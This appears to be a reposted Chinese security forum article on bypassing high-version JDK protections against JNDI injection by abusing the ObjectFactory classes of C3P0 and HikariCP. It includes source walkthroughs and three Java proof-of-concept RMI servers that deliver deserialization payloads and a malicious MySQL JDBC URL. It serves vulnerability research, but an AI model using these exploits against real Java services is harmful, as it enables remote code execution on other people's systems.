# JNDI高版本JDK绕过--C3P0/HikariCP

> **来源**: https://forum.butian.net/share/2960  
> **文章ID**: 2960

---

JDNI注入漏洞已经很是众所周知了，针对高版本JDK的绕过方式主要是基于javax.naming.spi.ObjectFactory实现类的利用或者是通过反序列化进行绕过，本文主要讲述两个基于javax.naming.spi.ObjectFactory实现类来进行绕过高版本JDK点。  
文中不再絮叨基于`javax.naming.spi.ObjectFactory`实现类的绕过原理了，而是直接步入正题。本文所用环境为JDK8U252

文章思路均来自于大佬的一句话  
> ObjectFactory 的实现类里有好几个类都是用来实例化数据源的，如果能够触发数据库连接，那就可以用 jdbc 来 RCE。  
那么反过来想一下，连接池是不是都要实例化数据源，那么来看一下一些常用的数据源是否有可以利用的点呢。

C3P0
----

C3P0是一个成熟且广泛使用的开源JDBC连接池，提供了丰富的配置选项以处理各种数据库连接场景。它的特点包括对连接断开的自动恢复、表现出色的并发性能、缓慢查询日志输出以及可选的Statement缓存等。而且，C3P0可以适应各类JDBC驱动，并且可以灵活地配置连接的获取和释放策略，以适应各种数据库类型和应用场景。测试C3P0版本为：0.9.5.2

直接来看`com.mchange.v2.c3p0.impl.C3P0JavaBeanObjectFactory`，这个类并没有直接实现`ObjectFactory`，而是在其父类`com.mchange.v2.naming.JavaBeanObjectFactory`实现了`ObjectFactory`接口，看一下`com.mchange.v2.naming.JavaBeanObjectFactory#getObjectInstance`做了什么事

```java
public Object getObjectInstance(Object refObj, Name name, Context nameCtx, Hashtable env)throws Exception{
if (refObj instanceof Reference)
    {
    Reference ref = (Reference) refObj; // 强转refObj
    Map refAddrsMap = new HashMap();    // 拿出所有的属性
    for (Enumeration e = ref.getAll(); e.hasMoreElements(); )
        {
        RefAddr addr = (RefAddr) e.nextElement();
        refAddrsMap.put( addr.getType(), addr );
        }   // 加载指定的class
    Class beanClass = Class.forName( ref.getClassName() );
    Set refProps = null;    
// 拿到并移除传入属性中key是
// com.mchange.v2.naming.JavaBeanReferenceMaker.REF_PROPS_KEY的一对键值
    RefAddr refPropsRefAddr = (BinaryRefAddr) refAddrsMap.remove( JavaBeanReferenceMaker.REF_PROPS_KEY );
    if ( refPropsRefAddr != null )  // 当传入的属性中包含这对键值时进入
        // BinaryRefAddr中key是String.class,value是byte[].class
        // 此处对Value进行了反序列化操作
        refProps = (Set) SerializableUtils.fromByteArray( (byte[]) refPropsRefAddr.getContent() );
        // 根据传入的ref，和指定的beanClass，也就是ref中的key是否与beanClass中是否有对应key,有就取出
        Map propMap = createPropertyMap( beanClass, refAddrsMap );
        return findBean( beanClass, propMap, refProps ); // 简单点说，创建一个javaBean
    }
else
    return null;
}
```

上半部分其实很好理解，主要是`createPropertyMap`和`findBean`，跟进到`com.mchange.v2.naming.JavaBeanObjectFactory#createPropertyMap`，总结一下这个方法就是从refAddr中取出能够放到bean对象中的传入的键值对

![image.png](images/attach-9dc99994f4f5d44604adf637a1c6dc4262697f23.png)  
然后继续来到`com.mchange.v2.c3p0.impl.C3P0JavaBeanObjectFactory#findBean`

![image.png](images/attach-0eb6001be4cb9a18de2d09a3b9ef609eca85d92a.png)  
`com.mchange.v2.naming.JavaBeanObjectFactory#findBean`

![image.png](images/attach-2f5292a128dd08be861cd2ade1d8e51627724574.png)  
设置完字段值之后，基本上流程到这里也就结束了，再来看一下哪里能够利用

### 反序列化

首先肯定是在`com.mchange.v2.naming.JavaBeanObjectFactory#getObjectInstance`中的那个`SerializableUtils.fromByteArray( (byte[]) refPropsRefAddr.getContent() )`，跟进`fromByteArray`方法

![image.png](images/attach-91751b10e2b8a57c842906e42e108d033c12c8f6.png)  
`com.mchange.v2.ser.SerializableUtils#deserializeFromByteArray`一段很朴实无华的反序列化

![image.png](images/attach-baf381d0e7de76648c758aa5720f5621fc33e973.png)  
所以此时就可以进行利用了，需要的条件

- 目标存在JNDI注入，但JDK版本过高
- 存在C3P0的jar包
- 存在反序列化利用链
- refAddr中存在一个以`com.mchange.v2.naming.JavaBeanReferenceMaker.REF_PROPS_KEY`为addrType的address，并且是一个`BinaryRefAddr`
    
    ```java
    public static void main(String[] args) throws Exception {
    Reference ref = new Reference("java.lang.Object",
            "com.mchange.v2.c3p0.impl.C3P0JavaBeanObjectFactory",null);
    
    ref.add(new BinaryRefAddr("com.mchange.v2.naming.JavaBeanReferenceMaker.REF_PROPS_KEY", \
                              Utils.base64ToByte("rO0ABXNyABFqYXZhLnV....")));  // 反序列化链的base64字节数组
    
    Registry registry = LocateRegistry.createRegistry(3333);
    ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
    registry.bind("calc", referenceWrapper);
    }
    ```

![image.png](images/attach-047b018dca7f4b94efb81c17740d22d596890107.png)  
不过这里不仅有一个反序列化的点，在刚刚的流程中也能够看到还有一个反序列化的点，不过那个跟这个基本类似，只需要更改ref.add()方法中传入的值即可。

### 反射调用setter方法

在刚刚的分析过程中，能够很明显的发现存在反射调用setter方法的地方，这个时候，貌似就能够进行利用了。只需要满足：

- 某个类中的setter方法能够直接或间接的利用  
    比如说，在fastjson中用的**C3P0\_Hex\_Base**，在这里就能够直接使用

```java
public static void main(String[] args) throws Exception {
    Reference ref = new Reference("com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
            "com.mchange.v2.c3p0.impl.C3P0JavaBeanObjectFactory", null);

    String poc = "aced00057372001"; // 别忘了满足十六进制ascii每字节必须为两位数字。

    ref.add(new StringRefAddr("userOverridesAsString", "HexAsciiSerializedMap:" + poc));
    Registry registry = LocateRegistry.createRegistry(3333);
    ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
    registry.bind("calc", referenceWrapper);
}
```

![image.png](images/attach-0818ff6b6ba9f2d004f7a8806bcf23cdcb68c8ef.png)

HikariCP
--------

HikariCP是一个高性能、简洁且稳定的Java数据库连接池，被广泛应用在高并发环境下。它致力于提供更快的性能，同时通过减少配置的复杂度实现用户友好。极低的启动时间、高吞吐量以及丰富的错误诊断信息是其显著特征，还拥有队列式公平调度策略，确保资源的优雅调度。  
直接来看这个连接池中实现了`ObjectFactory`的类，直接来看`com.zaxxer.hikari.HikariJNDIFactory#getObjectInstance`

![image.png](images/attach-e9bbac2da19ff3d95969a5a822945c4c1b4c06c2.png)  
跟进来到`com.zaxxer.hikari.HikariJNDIFactory#createDataSource`

![image.png](images/attach-baa130abbd47ff58e94218cafa15d00bfadf8de3.png)  
JNDI那个就没必要看了，直接来到`com.zaxxer.hikari.HikariDataSource#HikariDataSource(com.zaxxer.hikari.HikariConfig)`

![image.png](images/attach-bf97b89b3aad24500b4f5af4283e9b4b005e4345.png)  
`com.zaxxer.hikari.pool.PoolBase#PoolBase`

![image.png](images/attach-9a0956e3c7f8f6b37288f925b11adb3e0efd511e.png)  
`com.zaxxer.hikari.pool.PoolBase#initializeDataSource`

![image.png](images/attach-13bbfe5ba7098560314f36dedd20ae751d62bf34.png)  
再往下就没必要继续跟了，还是数据库创建连接的那一套，到这里就知道创建数据库链接所需的条件是怎么来的了，此时，有了创建数据库链接的地方，还记得JDBC相关的漏洞嘛，当存在该连接池，并且存在一个有漏洞的jdbc时，是不是就可以进行漏洞利用了

当然，这里还有个点需要说一下，就是`jdbcUrl`这个值的事情

这里需要注意的就是传入的url的addrType是`jdbcUrl`，因为有些连接池中用的值是`url`，所以这也是一个小小的坑点

为什么是这个值是因为`com.zaxxer.hikari.util.PropertyElf#setTargetFromProperties`，反射设置HikaiConfig中的值，因为HikaiConfig的jdbc url的字段名是`jdbcUrl`

![image.png](images/attach-041eee29bcdb1db915cb5f7ad6d0a99216853e20.png)  
然后这里我用了MySQL JDBC(5.1.48版本)的漏洞

```java
public static void main(String[] args) throws Exception {
    Reference ref = new Reference("javax.sql.DataSource",
            "com.zaxxer.hikari.HikariJNDIFactory", null);

    String jdbc_url = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors" +
            "=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_cc6_calc";

    ref.add(new StringRefAddr("driverClassName","com.mysql.jdbc.Driver"));
    ref.add(new StringRefAddr("jdbcUrl",jdbc_url));

    Registry registry = LocateRegistry.createRegistry(3333);
    ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
    registry.bind("calc", referenceWrapper);
}
```

![image.png](images/attach-56162aa01d497facb8693620b8586d62dcc045cf.png)

总结
--

本篇文章，是在学习完两位大佬的文章后，自行举一反三出来的，这里列举了两种数据库连接池，其他一些数据库连接池其实也多多少少都有些可以利用的点，若是遇到了类似常见可以试一下。最后，文章若是有什么错误的地方，还望大佬们指出，会及时修正的???

参考连接
----

- [https://tttang.com/archive/1405/#toc\_dbcp](https://tttang.com/archive/1405/#toc_dbcp)
- [https://xz.aliyun.com/t/10656](https://xz.aliyun.com/t/10656?time__1311=mq%2BxBDy7G%3DLOD%2FD0DoY4GIQ7Kl8DWwvD&alichlgref=https%3A%2F%2Ftttang.com%2F)
